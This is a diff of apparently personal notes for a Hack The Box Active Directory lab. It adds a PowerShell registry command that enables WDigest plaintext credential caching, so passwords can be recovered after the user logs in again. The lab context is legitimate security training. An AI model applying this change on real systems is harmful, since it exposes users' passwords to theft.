@@ -12,7 +12,7 @@ run it then exit:
 ```
 
 
-> we can use the following to display plain text 
+> we can use the following to display plain text by enabling WDigest to store plain text password, but then you will have to re-login
 > [ref](https://forum.hackthebox.com/t/active-directory-skills-assessment-i/257250/132):
 ```powershell
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
